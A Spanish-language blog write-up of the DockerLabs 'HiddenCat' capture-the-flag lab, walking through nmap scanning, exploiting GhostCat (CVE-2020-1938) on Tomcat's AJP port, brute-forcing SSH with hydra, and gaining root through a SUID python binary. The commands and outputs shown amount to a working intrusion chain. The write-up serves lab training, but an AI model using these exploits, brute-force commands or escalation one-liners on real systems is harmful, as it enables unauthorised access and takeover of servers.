---
title: DockerLabs - HiddenCat
summary: "Write-up del laboratorio HiddenCat de DockerLabs"
author: elcybercurioso
date: 2025-11-04 20:33:26
categories: [Post, DockerLabs]
tags: [fácil, apache, brute force, suid, privesc]
media_subpath: "/assets/img/posts/dockerlabs_hiddencat"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(venv)─(root㉿kalilinux)-[/home/elcybercurioso/Desktop/DockerLabs/HiddenCat]
└─# nmap -p- -sS --min-rate 5000 -n -Pn -v 172.17.0.2 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 14:02 GMT
Initiating ARP Ping Scan at 14:02
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:02, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:02
Scanning 172.17.0.2 [65535 ports]
Discovered open port 8080/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 8009/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:02, 0.57s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(venv)─(root㉿kalilinux)-[/home/elcybercurioso/Desktop/DockerLabs/HiddenCat]
└─# nmap -sCV -p22,8009,8080 172.17.0.2                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 14:02 GMT
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8d:56:7f:47:95:da:d9:a4:bb:bc:3e:f1:56:93:d5 (RSA)
|   256 8d:82:e6:7d:fb:1c:08:89:06:11:5b:fd:a8:08:1e:72 (ECDSA)
|_  256 1e:eb:63:bd:b9:87:72:43:49:6c:76:e1:45:69:ca:75 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```



Debido a algunos errores que dan, tal y como indica el compañero [`Pyth0nK1d`](https://pyth0nk1d.medium.com/) en el siguiente comentario, debemos hacer un cambio en el script `auto_deploy.sh`, ya que de lo contrario no podremos desplegar el laboratorio:

![Desktop View](/20251102150046.webp){: width="972" height="589" .shadow}

El comando que indica es el siguiente:

```bash
docker run -d --name $CONTAINER_NAME $IMAGE_NAME /bin/bash -c "service ssh start ; ulimit -n 65536 ; /usr/local/tomcat/bin/catalina.sh run ; while true; do echo 'Alive'; sleep 60; done" > /dev/null
```

## explotación

Una vez hecho el cambio mencionado, podremos ver que accedemos correctamente:

![Desktop View](/20251102150401.webp){: width="972" height="589" .shadow}

 Nos encontramos que en el puerto 8009 se encuentra desplegado `Apache Jserv (Protocol v1.3)`, el cual es vulnerable a un file read/inclusion (CVE-2020-1938). Nos bajamos el siguiente script de [GitHub](https://github.com/YounesTasra-R4z3rSw0rd/CVE-2020-1938), el cual al ejecutarlo, veremos que nos recupera el contenido de un fichero:

```bash
┌───(root㉿kalilinux)-[/home/elcybercurioso/Desktop/DockerLabs/HiddenCat]
└─# python3 GhostCat_Exploit.py -p 8009 172.17.0.2           
Getting resource at ajp13://172.17.0.2:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>
```

Dado que en el anterior fichero se hace mención al usuario `jerry`, tratamos de obtener por fuerza bruta la contraseña del mismo por SSH:

```bash
┌───(root㉿kalilinux)-[/home/elcybercurioso/Desktop/DockerLabs/HiddenCat]
└─# hydra -l jerry -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -I -t 64

[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: jerry   password: ch*******
1 of 1 target successfully completed, 1 valid password found
```

Teniendo las credenciales, accedemos como `jerry`:

```bash
┌───(root㉿kalilinux)-[/home/elcybercurioso/Desktop/DockerLabs/HiddenCat]
└─# ssh jerry@172.17.0.2
jerry@172.17.0.2's password: 
jerry@e3ff2c65837b:~$ whoami
jerry
jerry@e3ff2c65837b:~$ hostname -I
172.17.0.2
```

## escalada de privilegios

Comprobamos los binarios que tienen permisos SUID, y encontramos varios que nos permiten escalar privilegios:

```bash
jerry@e3ff2c65837b:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/perl
/usr/bin/perl5.28.1
/usr/bin/chsh
/usr/bin/python3.7
/usr/bin/python3.7m
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount
```

 El que emplearemos es Python, para el cual en [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) nos indican como explotarlo:

![Desktop View](/20251102151940.webp){: width="972" height="589" .shadow}

Ejecutamos el comando que mencionan, y vemos que ya tenemos acceso como el usuario `root`:

```bash
jerry@e3ff2c65837b:~$ /usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```

Con esto, habremos obtenido acceso como `root` en el laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>